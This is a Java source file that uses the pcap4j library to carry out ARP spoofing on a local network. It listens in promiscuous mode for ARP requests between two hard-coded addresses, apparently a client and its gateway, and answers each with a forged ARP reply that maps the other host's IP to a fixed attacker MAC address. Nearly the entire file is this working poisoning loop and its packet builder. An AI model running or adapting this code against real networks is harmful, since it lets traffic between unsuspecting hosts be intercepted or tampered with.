import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

@SuppressWarnings("javadoc")
public class SendArpReplay {
    private static final String COUNT_KEY = SendArpRequest.class.getName() + ".count";
    private static final int COUNT = Integer.getInteger(COUNT_KEY, 1);

    private static final String READ_TIMEOUT_KEY = SendArpRequest.class.getName() + ".readTimeout";
    private static final int READ_TIMEOUT = Integer.getInteger(READ_TIMEOUT_KEY, 100); // [ms]
    private static final String BUFFER_SIZE_KEY = SendArpReplay.class.getName() + ".bufferSize";
    private static final int BUFFER_SIZE =
            Integer.getInteger(BUFFER_SIZE_KEY, 1 * 1024 * 1024);
    private static final String SNAPLEN_KEY = SendArpRequest.class.getName() + ".snaplen";
    private static final int SNAPLEN = Integer.getInteger(SNAPLEN_KEY, 65536); // [bytes]
    private static final MacAddress SRC_MAC_ADDR = MacAddress.getByName("60:36:DD:EF:F7:95");
    private static InetAddress IP_ADD_1;
    private static InetAddress IP_ADD_2;


    private SendArpReplay() {
    }

    public static void main(String[] args) throws PcapNativeException, NotOpenException, UnknownHostException {
        IP_ADD_1 = InetAddress.getByName("192.168.43.61");
        IP_ADD_2 = InetAddress.getByName("192.168.43.1");

        System.out.println(COUNT_KEY + ": " + COUNT);
        System.out.println(READ_TIMEOUT_KEY + ": " + READ_TIMEOUT);
        System.out.println(SNAPLEN_KEY + ": " + SNAPLEN);
        System.out.println("\n");

        PcapNetworkInterface nif;
        try {
            nif = new NifSelector().selectNetworkInterface();
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }

        if (nif == null) {
            return;
        }

        System.out.println(nif.getName() + "(" + nif.getDescription() + ")");

        PcapHandle sendHandle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);

        try {
            PcapHandle.Builder phb =
                    new PcapHandle.Builder(nif.getName())
                            .snaplen(SNAPLEN)
                            .promiscuousMode(PromiscuousMode.PROMISCUOUS)
                            .timeoutMillis(READ_TIMEOUT)
                            .bufferSize(BUFFER_SIZE);

            PcapHandle handle = phb.build();

//            handle.setFilter(filter, BpfCompileMode.OPTIMIZE);

            while (true) {
                Packet packet = handle.getNextPacket();
                if (packet == null) {
                    continue;
                } else {
                    if (packet.contains(ArpPacket.class)) {
                        ArpPacket arp = packet.get(ArpPacket.class);
                        if (arp.getHeader().getOperation().equals(ArpOperation.REQUEST)) {
                            if (arp.getHeader().getSrcProtocolAddr().toString().equals("/" + IP_ADD_1)
                            && arp.getHeader().getDstProtocolAddr().toString().equals("/" + IP_ADD_2)) {
                                System.out.println("new arp brodcast \n" + packet);
                                Packet p = etherBuilder(IP_ADD_2, arp.getHeader().getSrcProtocolAddr(), arp.getHeader().getSrcHardwareAddr()).build();
                                System.out.println(p);
                                sendHandle.sendPacket(p);
                            }
                            if (arp.getHeader().getSrcProtocolAddr().toString().equals("/" + IP_ADD_2)
                                    && arp.getHeader().getDstProtocolAddr().toString().equals("/" + IP_ADD_1)) {
                                System.out.println("new arp brodcast \n" + packet);
                                Packet p = etherBuilder(IP_ADD_1, arp.getHeader().getSrcProtocolAddr(), arp.getHeader().getSrcHardwareAddr()).build();
                                System.out.println(p);
                                sendHandle.sendPacket(p);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static EthernetPacket.Builder etherBuilder(InetAddress fakeSrc, InetAddress ip, MacAddress mac) {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();

        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(SRC_MAC_ADDR)
                .srcProtocolAddr(fakeSrc)
                .dstHardwareAddr(mac)
                .dstProtocolAddr(ip);


        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder
                .dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS)
                .srcAddr(SRC_MAC_ADDR)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        return etherBuilder;
    }
}
